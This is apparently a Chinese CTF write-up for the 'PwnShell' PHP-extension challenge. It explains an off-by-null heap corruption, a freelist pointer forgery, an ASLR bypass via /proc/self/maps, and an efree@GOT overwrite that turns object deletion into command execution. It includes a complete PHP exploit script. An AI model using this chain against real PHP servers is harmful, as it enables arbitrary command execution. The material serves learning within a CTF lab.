# PwnShell

## 题目简述

题目提供了一个带漏洞的 PHP 扩展。`addHacker` 在处理用户数据时存在 off-by-null，可在相邻堆块元数据中多写入一个空字节。通过合适的堆布局，可以伪造空闲链表的 `fd` 指针并制造堆块重叠，最终把一次分配转化为受控地址写。

地址随机化可通过 PHP 的文件包含能力绕过：包含 `/proc/self/maps` 会把当前进程的内存映射输出到缓冲区，从中解析 libc 与 `vuln.so` 的加载基址。获得任意地址写后，覆盖扩展模块中 `efree` 对应的 GOT 项，再调用 `removeHacker`，即可让释放函数改为执行攻击者控制的命令字符串。

## 解题过程

### 利用 off-by-null 制造重叠

`addHacker` 对长度边界处理错误，写满目标缓冲区时还会追加结尾的 `\x00`。这个空字节落到下一个堆块的元数据中。利用过程为：

1. 连续创建多个尺寸相邻的 Hacker 对象；
2. 用 off-by-null 修改相邻块的尺寸或状态字段；
3. 释放并重新申请相关块，使分配器接受被缩小或重叠的块布局；
4. 在重叠区域伪造空闲链表 `fd`；
5. 令后续分配返回到扩展模块的目标 GOT 地址附近。

最终目标不是持续控制复杂的堆状态，而是得到一次“把给定 8 字节值写到给定地址”的机会。

### 从 `/proc/self/maps` 取得基址

PHP `include` 遇到不含 PHP 标签的普通文本时会直接输出其内容。配合输出缓冲，可以读取 `/proc/self/maps`，再用正则提取：

- `/usr/lib/x86_64-linux-gnu/libc.so.6` 的首个映射地址；
- `vuln.so` 的首个映射地址。

这样无需依赖额外的堆指针泄露，即可得到：

$$
\mathrm{target}_{GOT}=\mathrm{module\_base}+0x4038
$$

以及题目所用 libc 中目标函数的运行时地址：

$$
\mathrm{target}_{libc}=\mathrm{libc\_base}+0x4c490
$$

两个偏移均与附件版本绑定，复现前必须用 `readelf`、反汇编结果和所给 libc 重新确认。这里的 `0x4038` 对应扩展中调用 `efree` 时经过的 GOT 项；`0x4c490` 是官方环境中用于执行命令的 libc 入口。

### 覆盖 `efree@GOT`

伪造链表指针时，将目标设置为 `module_base + 0x4038`。经过三次 `addHacker` 后：

- 第一个对象用于稳定堆布局；
- 第二个对象携带伪造指针和尺寸；
- 第三个对象保存以空字节结尾的命令字符串。

随后用 `editHacker(0, target_libc)` 完成 GOT 覆盖，再执行 `removeHacker(2)`。程序原本要对第三个对象调用 `efree(command)`，覆盖后则会把 `command` 当作目标函数的第一个参数。

下面是整理后的完整 PHP 利用脚本。命令通过第一个命令行参数传入，避免在 WP 中保留一次性的反弹地址：

```php
<?php
declare(strict_types=1);

$libcBase = 0;
$moduleBase = 0;

function p64(int $value): string
{
    $hex = str_pad(dechex($value), 16, "0", STR_PAD_LEFT);
    return strrev(hex2bin($hex));
}

function leakMappings(): void
{
    global $libcBase, $moduleBase;

    ob_start();
    include "/proc/self/maps";
    $maps = ob_get_clean();

    $libcPattern = '/^([0-9a-f]+)-[0-9a-f]+.*\/libc\.so\.6$/m';
    $modulePattern = '/^([0-9a-f]+)-[0-9a-f]+.*\/vuln\.so$/m';

    if (!preg_match($libcPattern, $maps, $libcMatch)) {
        throw new RuntimeException("libc base not found");
    }
    if (!preg_match($modulePattern, $maps, $moduleMatch)) {
        throw new RuntimeException("vuln.so base not found");
    }

    $libcBase = intval($libcMatch[1], 16);
    $moduleBase = intval($moduleMatch[1], 16);
}

function attack(string $command): void
{
    global $libcBase, $moduleBase;

    $efreeGot = $moduleBase + 0x4038;
    $callTarget = $libcBase + 0x4c490;

    $fake = str_pad(p64($efreeGot) . p64(0xff), 0x40, "\x90");

    addHacker(str_repeat("\x90", 0x08), str_repeat("\x90", 0x30));
    addHacker($fake, str_repeat("\x90", 0x2f));
    addHacker(str_pad($command, 0x20, "\x00"), "114514");

    editHacker(0, p64($callTarget));
    removeHacker(2);
}

$command = $argv[1] ?? "id";
leakMappings();
attack($command);
?>
```

## 方法总结

本题利用链由三个独立环节组成：off-by-null 改写相邻堆块元数据、伪造空闲链表指针取得任意地址写、通过 `/proc/self/maps` 消除 ASLR 影响。最后选择覆盖 `efree@GOT`，是因为扩展会在删除对象时把可控内容指针直接传给 `efree`，函数参数天然满足命令执行入口的调用约定。

利用脚本中的模块偏移与 libc 偏移不是通用常量。迁移到其他环境时，必须重新确认扩展版本、PHP 构建目录、GOT 位置和 libc 符号；仅复用堆布局而不核对这些条件，会导致错误地址写或直接崩溃。
